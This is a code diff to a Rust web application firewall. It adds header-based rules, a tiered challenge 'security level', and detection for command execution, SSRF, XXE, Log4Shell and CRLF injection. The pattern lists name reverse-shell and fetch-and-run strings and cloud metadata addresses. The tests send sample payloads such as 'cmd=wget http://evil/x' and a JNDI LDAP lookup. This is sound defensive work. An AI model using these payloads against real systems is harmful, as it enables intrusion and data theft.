@@ -32,7 +32,7 @@ pub enum WafAction {
     Challenge,
 }
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+#[derive(Debug, Clone, PartialEq, Eq)]
 pub enum WafField {
     Path,
     Query,
@@ -40,11 +40,21 @@ pub enum WafField {
     Referer,
     Method,
     Ip,
+    /// Arbitrary request header (`header:x-api-key`).
+    Header(String),
 }
 
 impl WafField {
     pub fn parse(s: &str) -> Option<Self> {
-        match s.trim().to_ascii_lowercase().as_str() {
+        let s = s.trim().to_ascii_lowercase();
+        if let Some(name) = s.strip_prefix("header:") {
+            let name = name.trim();
+            if name.is_empty() || name.len() > 64 {
+                return None;
+            }
+            return Some(WafField::Header(name.to_string()));
+        }
+        match s.as_str() {
             "path" | "uri" => Some(WafField::Path),
             "query" | "args" => Some(WafField::Query),
             "user_agent" | "user-agent" | "ua" => Some(WafField::UserAgent),
@@ -52,6 +62,39 @@ impl WafField {
             "method" => Some(WafField::Method),
             "ip" => Some(WafField::Ip),
             _ => None,
+        }
+    }
+}
+
+/// Cloudflare-style security level applied after explicit rules.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum SecurityLevel {
+    #[default]
+    Off,
+    Low,
+    Medium,
+    High,
+    UnderAttack,
+}
+
+impl SecurityLevel {
+    pub fn parse(s: &str) -> Self {
+        match s.trim().to_ascii_lowercase().as_str() {
+            "low" => SecurityLevel::Low,
+            "medium" | "mid" => SecurityLevel::Medium,
+            "high" => SecurityLevel::High,
+            "under_attack" | "underattack" | "attack" => SecurityLevel::UnderAttack,
+            _ => SecurityLevel::Off,
+        }
+    }
+
+    pub fn label(self) -> &'static str {
+        match self {
+            SecurityLevel::Off => "关闭",
+            SecurityLevel::Low => "低",
+            SecurityLevel::Medium => "中",
+            SecurityLevel::High => "高",
+            SecurityLevel::UnderAttack => "攻击中",
         }
     }
 }
@@ -103,6 +146,11 @@ pub struct ManagedRules {
     pub xss: bool,
     pub traversal: bool,
     pub scanners: bool,
+    pub rce: bool,
+    pub ssrf: bool,
+    pub xxe: bool,
+    pub log4shell: bool,
+    pub crlf: bool,
 }
 
 impl Default for ManagedRules {
@@ -112,6 +160,11 @@ impl Default for ManagedRules {
             xss: true,
             traversal: true,
             scanners: true,
+            rce: true,
+            ssrf: true,
+            xxe: true,
+            log4shell: true,
+            crlf: true,
         }
     }
 }
@@ -186,6 +239,8 @@ pub struct WafConfig {
     pub challenge_difficulty: u8,
     /// How long a solved challenge keeps the client cleared (seconds).
     pub challenge_ttl_secs: u64,
+    /// Challenge policy applied after explicit rules.
+    pub security_level: SecurityLevel,
 }
 
 impl Default for WafConfig {
@@ -199,6 +254,7 @@ impl Default for WafConfig {
             ip_deny: Vec::new(),
             challenge_difficulty: 4,
             challenge_ttl_secs: 1800,
+            security_level: SecurityLevel::Off,
         }
     }
 }
@@ -292,6 +348,123 @@ const SCANNER_PATH: &[&str] = &[
     "/.DS_Store",
 ];
 
+const RCE: &[&str] = &[
+    ";wget ",
+    ";curl ",
+    "|bash",
+    "|sh",
+    "/bin/sh",
+    "/bin/bash",
+    "cmd.exe",
+    "powershell",
+    "nc -e",
+    "bash -i",
+    "sh -c",
+    "cmd=",
+    "exec(",
+    "system(",
+    "$(",
+];
+
+const SSRF: &[&str] = &[
+    "169.254.169.254",
+    "metadata.google.internal",
+    "metadata.tencentyun.com",
+    "100.100.100.200",
+    "file://",
+    "gopher://",
+    "dict://",
+    "ftp://",
+];
+
+const XXE: &[&str] = &[
+    "<!doctype",
+    "<!entity",
+    "system \"",
+    "system '",
+    "file:///etc",
+    "expect(",
+];
+
+const LOG4SHELL: &[&str] = &["${jndi:", "jndi:ldap", "jndi:rmi", "jndi:dns"];
+
+/// Static assets are never challenged by security levels.
+const STATIC_EXT: &[&str] = &[
+    ".css", ".js", ".mjs", ".map", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico",
+    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".mp4", ".webm", ".mp3", ".webp", ".avif",
+];
+
+fn is_static_asset(path: &str) -> bool {
+    let last = path.rsplit('/').next().unwrap_or("");
+    if !last.contains('.') {
+        return false;
+    }
+    let ext = format!(
+        ".{}",
+        last.rsplit('.').next().unwrap_or("").to_ascii_lowercase()
+    );
+    STATIC_EXT.contains(&ext.as_str())
+}
+
+fn looks_like_document(headers: &HeaderMap, path: &str) -> bool {
+    let accept = headers
+        .get("accept")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("")
+        .to_ascii_lowercase();
+    if accept.contains("text/html") {
+        return true;
+    }
+    if path.ends_with('/') {
+        return true;
+    }
+    let last = path.rsplit('/').next().unwrap_or("");
+    !last.contains('.')
+}
+
+fn header_value(headers: &HeaderMap, name: &str) -> String {
+    headers
+        .get(name)
+        .and_then(|v| v.to_str().ok())
+        .map(decode_lower)
+        .unwrap_or_default()
+}
+
+fn level_verdict(
+    level: SecurityLevel,
+    method: &str,
+    path: &str,
+    ua: &str,
+    headers: &HeaderMap,
+) -> Option<WafVerdict> {
+    if level == SecurityLevel::Off {
+        return None;
+    }
+    if !method.eq_ignore_ascii_case("GET") && !method.eq_ignore_ascii_case("HEAD") {
+        return None;
+    }
+    if is_static_asset(path) {
+        return None;
+    }
+    let empty_ua = ua.trim().is_empty();
+    let suspicious_ua = empty_ua || contains_any(ua, SCANNER_UA);
+    let trigger = match level {
+        SecurityLevel::Low => empty_ua,
+        SecurityLevel::Medium => suspicious_ua,
+        SecurityLevel::High => looks_like_document(headers, path),
+        SecurityLevel::UnderAttack => true,
+        SecurityLevel::Off => false,
+    };
+    if !trigger {
+        return None;
+    }
+    Some(WafVerdict {
+        action: WafAction::Challenge,
+        rule_name: format!("安全级别 · {}", level.label()),
+        category: "security_level".into(),
+    })
+}
+
 /// Percent-decode then lower-case (ASCII). Invalid escapes are kept verbatim.
 pub fn decode_lower(input: &str) -> String {
     let bytes = input.as_bytes();
@@ -360,6 +533,27 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
             return Some(verdict("敏感路径探测", "scanners"));
         }
     }
+    let url_part = format!("{path}?{query}");
+    if cfg.managed.rce && contains_any(&haystack, RCE) {
+        return Some(verdict("命令执行", "rce"));
+    }
+    if cfg.managed.ssrf && contains_any(&url_part, SSRF) {
+        return Some(verdict("SSRF / 云元数据", "ssrf"));
+    }
+    if cfg.managed.xxe && contains_any(&haystack, XXE) {
+        return Some(verdict("XXE 外部实体", "xxe"));
+    }
+    if cfg.managed.log4shell && contains_any(&haystack, LOG4SHELL) {
+        return Some(verdict("Log4Shell", "log4shell"));
+    }
+    if cfg.managed.crlf
+        && (path.contains('\r')
+            || path.contains('\n')
+            || query.contains('\r')
+            || query.contains('\n'))
+    {
+        return Some(verdict("CRLF / 头注入", "crlf"));
+    }
 
     // Custom rules: highest priority first, first match wins.
     let mut rules: Vec<&WafRule> = cfg.rules.iter().filter(|r| r.enabled).collect();
@@ -367,15 +561,16 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
     let method = req.method.to_ascii_lowercase();
     let ip_text = req.ip.map(|i| i.to_string()).unwrap_or_default();
     for rule in rules {
-        let value: &str = match rule.field {
-            WafField::Path => &path,
-            WafField::Query => &query,
-            WafField::UserAgent => &ua,
-            WafField::Referer => &referer,
-            WafField::Method => &method,
-            WafField::Ip => &ip_text,
+        let value: String = match &rule.field {
+            WafField::Path => path.clone(),
+            WafField::Query => query.clone(),
+            WafField::UserAgent => ua.clone(),
+            WafField::Referer => referer.clone(),
+            WafField::Method => method.clone(),
+            WafField::Ip => ip_text.clone(),
+            WafField::Header(name) => header_value(req.headers, name),
         };
-        if rule.op.matches(value, &rule.value) {
+        if rule.op.matches(&value, &rule.value) {
             return Some(WafVerdict {
                 action: rule.action,
                 rule_name: rule.name.clone(),
@@ -384,7 +579,7 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
         }
     }
 
-    None
+    level_verdict(cfg.security_level, req.method, &path, &ua, req.headers)
 }
 
 fn verdict(name: &str, category: &str) -> WafVerdict {
@@ -409,6 +604,7 @@ mod tests {
             ip_deny: vec![],
             challenge_difficulty: 4,
             challenge_ttl_secs: 1800,
+            security_level: SecurityLevel::Off,
         }
     }
 
@@ -525,6 +721,7 @@ mod tests {
             xss: false,
             traversal: false,
             scanners: false,
+            ..ManagedRules::default()
         };
         c.rules = vec![
             WafRule {
@@ -567,6 +764,7 @@ mod tests {
             xss: false,
             traversal: false,
             scanners: false,
+            ..ManagedRules::default()
         };
         c.rules = vec![WafRule {
             name: "observe api".into(),
@@ -581,6 +779,98 @@ mod tests {
         let v = evaluate(&c, &req(&h, "/api/x", "", "curl")).unwrap();
         assert_eq!(v.action, WafAction::Log);
         assert!(!v.is_block());
+    }
+
+    #[test]
+    fn detects_extended_managed_categories() {
+        let c = cfg();
+        let h = HeaderMap::new();
+        let cases = [
+            ("/run", "cmd=wget%20http://evil/x", "rce"),
+            ("/proxy", "url=http%3A%2F%2F169.254.169.254%2Fmeta", "ssrf"),
+            ("/xml", "data=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY", "xxe"),
+            (
+                "/login",
+                "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D",
+                "log4shell",
+            ),
+        ];
+        for (path, query, category) in cases {
+            assert_eq!(
+                evaluate(&c, &req(&h, path, query, "curl"))
+                    .unwrap()
+                    .category,
+                category
+            );
+        }
+        assert_eq!(
+            evaluate(&c, &req(&h, "/safe", "q=a%0d%0aSet-Cookie:%20x=1", "curl"))
+                .unwrap()
+                .category,
+            "crlf"
+        );
+    }
+
+    #[test]
+    fn header_field_matching() {
+        let mut c = cfg();
+        c.rules = vec![WafRule {
+            name: "block bad key".into(),
+            field: WafField::Header("x-api-key".into()),
+            op: WafOp::Equals,
+            value: "bad".into(),
+            action: WafAction::Block,
+            priority: 1,
+            enabled: true,
+        }];
+        let mut h = HeaderMap::new();
+        h.insert("x-api-key", "bad".parse().unwrap());
+        assert_eq!(
+            evaluate(&c, &req(&h, "/", "", "curl")).unwrap().rule_name,
+            "block bad key"
+        );
+        h.insert("x-api-key", "good".parse().unwrap());
+        assert!(evaluate(&c, &req(&h, "/", "", "curl")).is_none());
+    }
+
+    #[test]
+    fn security_level_challenges_documents_but_not_assets() {
+        let mut c = cfg();
+        c.security_level = SecurityLevel::UnderAttack;
+        let mut h = HeaderMap::new();
+        h.insert("accept", "text/html".parse().unwrap());
+        let v = evaluate(&c, &req(&h, "/index.html", "", "Mozilla/5.0")).unwrap();
+        assert_eq!(v.action, WafAction::Challenge);
+        assert_eq!(v.category, "security_level");
+        // static assets are never challenged
+        assert!(evaluate(&c, &req(&h, "/static/app.js", "", "Mozilla/5.0")).is_none());
+        // non-GET/HEAD is not challenged by the level
+        let mut post = req(&h, "/index.html", "", "Mozilla/5.0");
+        post.method = "POST";
+        assert!(evaluate(&c, &post).is_none());
+    }
+
+    #[test]
+    fn security_level_medium_flags_empty_ua() {
+        let mut c = cfg();
+        c.managed = ManagedRules {
+            sqli: false,
+            xss: false,
+            traversal: false,
+            scanners: false,
+            rce: false,
+            ssrf: false,
+            xxe: false,
+            log4shell: false,
+            crlf: false,
+        };
+        c.security_level = SecurityLevel::Medium;
+        let h = HeaderMap::new();
+        assert_eq!(
+            evaluate(&c, &req(&h, "/", "", "")).unwrap().category,
+            "security_level"
+        );
+        assert!(evaluate(&c, &req(&h, "/", "", "Mozilla/5.0")).is_none());
     }
 
     #[test]
